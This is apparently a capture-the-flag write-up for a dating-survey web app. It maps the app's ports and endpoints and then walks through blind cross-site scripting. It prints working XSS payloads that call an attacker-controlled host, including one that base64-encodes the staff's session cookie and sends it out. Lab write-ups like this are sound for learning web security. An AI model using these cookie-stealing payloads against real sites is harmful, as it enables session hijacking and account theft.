# cupid's matchmaker

description mentions "real users read your personality survey", hinting the solution may be xss

---

notable ports:

- 22 ssh
- 631 ipp ??
- 5000 web

---

**initial fuzz results**

![fuzz](/images/20260319_00h19m26s_grim.png)

## exploring the web app

- take survey (POST /survey urlencoded)
  - name
  - age
  - gender
  - seeking
  - questions
- login/out
- admin endpoint
- no javascript

after taking the survey we get a cookie back, same format as the other werkzeug boxes

all it includes is the flashes to display right now

---

focusing on xss, we can put some test payloads in every field to see if we can get script execution in the staff's browser.

- do this through a proxy such as burp to make sure our chars get through raw

we cannot see our surveys after sending them, making this a blind xss- make a request to a webserver you control to leak data:

`<script>fetch("http://my_ip:8111/xss")</script>`
`<img src=x onerror=fetch("http://my_ip:8111/xss")>`

and we indeed get some requests back!!

![blindxss](/images/20260319_00h47m56s_grim.png)

seems like the basic script tag worked, now we just construct a payload to leak the cookie:

`<script>fetch("http://my_ip:8111/?xss="%2bbtoa(document.cookie))</script>`

ideally run a php server or something that decodes that from the param and logs it but im lazy and just used the python webserver logs and decode manually


